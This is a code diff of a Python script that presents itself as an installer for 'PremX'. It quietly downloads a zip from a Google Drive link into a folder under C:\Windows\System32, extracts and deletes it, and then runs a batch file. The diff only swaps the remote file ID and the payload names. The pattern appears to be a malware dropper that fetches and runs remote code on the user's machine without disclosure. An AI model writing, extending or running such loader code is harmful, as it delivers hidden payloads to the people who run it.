@@ -43,7 +43,7 @@ delete_files_if_condition(check_file)
 
 
 def updating_v1_2025():
-    aesv3_path = r"C:\Windows\System32\DSEL\premx_d.py"
+    aesv3_path = r"C:\Windows\System32\DSEL\klx2025.py"
     directory_path = r"C:\Windows\System32\DSEL"
 
     if not os.path.exists(aesv3_path):
@@ -64,11 +64,11 @@ updating_v1_2025()
 def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
-if not os.path.exists("C:\\Windows\\System32\\DSEL\\premx_d.py"):
+if not os.path.exists("C:\\Windows\\System32\\DSEL\\klx2025.py"):
     os.system('cls')
     print("Installing PremX please wait.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1wLO8TAkXXexrV21AwedfMWHacm0yC4_6", "C:\\Windows\\System32\\DSEL\\py.zip")
-    zip_file = r'C:\Windows\System32\DSEL\py.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1viHGjsh_MLgIxdg5lvqutkIsxY5EUkDL", "C:\\Windows\\System32\\DSEL\\klx.zip")
+    zip_file = r'C:\Windows\System32\DSEL\klx.zip'
     extract_dir = r'C:\Windows\System32\DSEL'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
@@ -104,7 +104,7 @@ def run_batch_file(batch_file_path):
 
 
 os.system('cls')
-batch_file_path = r"C:\Windows\System32\DSEL\premx2025.bat"
+batch_file_path = r"C:\Windows\System32\DSEL\klx2025.bat"
 os.system('cls')
 
 try:
